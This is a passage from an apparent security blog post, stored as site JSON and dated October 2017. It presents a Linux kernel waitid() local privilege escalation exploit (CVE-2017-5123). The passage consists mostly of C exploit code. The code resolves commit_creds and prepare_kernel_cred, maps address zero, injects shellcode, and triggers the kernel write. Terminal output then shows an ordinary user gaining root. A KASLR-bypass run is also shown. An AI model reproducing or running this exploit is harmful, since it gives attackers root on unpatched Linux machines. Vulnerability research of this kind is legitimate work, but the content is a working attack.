long)kernel_base);\r\n\r\n  int k_ver = (int)strtoul(argv[argc - 1], (char **)0, 0);\r\n\r\n  prepare_kernel_cred = (prepare_kernel_cred_t)(kernel_base + k_offset[k_ver][0]);\r\n  commit_creds = (commit_creds_t)(kernel_base + k_offset[k_ver][1]);\r\n  siginfo_t *have_canfork_callback = (siginfo_t *)(kernel_base + k_offset[k_ver][2]);\r\n\r\n  printf(\"\\e[35m[+] prepare_kernel_cred   \\e[34m: %#llx\\n\", (unsigned long long)prepare_kernel_cred);\r\n  printf(\"\\e[35m[+] commit_creds          \\e[34m: %#llx\\n\", (unsigned long long)commit_creds);\r\n  printf(\"\\e[35m[+] have_canfork_callback \\e[34m: %#llx\\n\", (unsigned long long)have_canfork_callback);\r\n\r\n  printf(\"\\e[36m[*] Stage 1 - Try to allocate 0x0\\n\");\r\n  if (mmap((void *)0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_PRIVATE | MAP_FIXED, -1, 0) == (char *)-1) {\r\n    printf(\"\\e[31m[-] Failed to allocate 0x0\\n\");\r\n    return EXIT_FAILURE;\r\n  }\r\n\r\n  printf(\"\\e[36m[*] Stage 2 - Inject shellcode\\n\");\r\n  \r\n  unsigned char shellcode[] = {\r\n      /* insert 0 into have_canfork_callback */\r\n      0x48, 0xB8,\r\n      0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, // mov rax, have_canfork_callback\r\n      0x48, 0xC7,\r\n      0x00, 0x00, 0x00, 0x00, 0x00,                   // mov [rax], 0x0\r\n      /* SMEP/SMAP Bypass */\r\n      // 0x68,\r\n      // 0xf0, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // push 0x00000000000006f0\r\n      // 0x5f, 0xc3,                                     // pop rdi; ret;\r\n      // 0x0f, 0x22, 0xe7, 0xc3,                         // mov cr4, rdi; ret;\r\n      /* call get_root() */\r\n      0x48, 0xB8,\r\n      0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, // mov rax, &get_root()\r\n      0xFF, 0xD0, 0x48,                               // call rax\r\n      /* userland info */\r\n      // 0x0f, 0x01, 0xf8, 0xc3                       // swapgs; ret;\r\n      // 0x48, 0xcf                                   // iretq;\r\n      // rip = get_shell\r\n      // cs = user_cs\r\n      // rflags = user_rflags\r\n      // rsp = asm('rsp')\r\n      // ss = user_ss\r\n      /* jmp to nullptr */\r\n      0x31, 0xC0, 0xC3,                               // xor rax, rax; ret;\r\n  };\r\n\r\n  void **offset = 0;\r\n  \r\n  offset = rawmemchr(shellcode, 0x41);\r\n  (*offset) = have_canfork_callback;\r\n\r\n  offset = rawmemchr(shellcode, 0x42);\r\n  (*offset) = get_root;\r\n\r\n  memcpy((void *)0, shellcode, sizeof(shellcode));\r\n\r\n  pid_t pid;\r\n  if ((pid = fork()) == -1) return EXIT_FAILURE;\r\n  if (pid == 0) return EXIT_FAILURE;\r\n\r\n  printf(\"\\e[36m[*] Stage 3 - Trigger waitid()\\n\");\r\n  if (waitid(P_PID, pid, have_canfork_callback, WEXITED | WSTOPPED | WCONTINUED) == -1) {\r\n    perror(\"waitpid()\");\r\n    return EXIT_FAILURE;\r\n  }\r\n\r\n  pid = fork(); // Trigger\r\n\r\n  if (pid > 0) get_shell();\r\n  return EXIT_SUCCESS;\r\n}\r\n```\r\n```c\r\n/ $ id\r\nuid=1001(zero) gid=1001(zero) groups=1001(zero)\r\n/ $ ./exp 0xffffffff81000000 0\r\n[*] Kernel Version : 4.14.0-rc4+\r\n[+] Kernel Base           : 0xffffffff81000000\r\n[+] prepare_kernel_cred   : 0xffffffff810753d0\r\n[+] commit_creds          : 0xffffffff81075050\r\n[+] have_canfork_callback : 0xffffffff81f3f45a\r\n[*] Stage 1 - Try to allocate 0x0\r\n[*] Stage 2 - Inject shellcode\r\n[*] Stage 3 - Trigger waitid()\r\n/ # id\r\nuid=0(root) gid=0(root)\r\n```\r\n\r\n[+] Plus\r\n\r\n```c\r\nzero@ubuntu:~/Desktop/kaslr_bypass$ ./exp 0\r\n[*] Kernel Version : 4.13.4-041304-generic\r\n[+] Kernel Base           : 0xffffffffa0a00000\r\n...\r\nzero@ubuntu:~/Desktop/kaslr_bypass$ sudo cat /proc/kallsyms | grep _text | head -n 1\r\nffffffffa0a00000 T _text\r\n```\r\n\r\n**End**\r\n","excerpt":"Linux Kernel waitid() Local Privilege Escalation TL;DR Some days ago, i just saw this vulnerability somewhere in google. It's about Kernel …","fields":{"slug":"/CVE-2017-5123/"},"frontmatter":{"date":"Oct 29, 2017","title":"LK v4.13.x - waitid() LPE","tags":["Security","Linux-Kernel"],"update":"Oct 29, 2017"}}}]}},"pageContext":{}},"staticQueryHashes":["2027115977","694178885"]}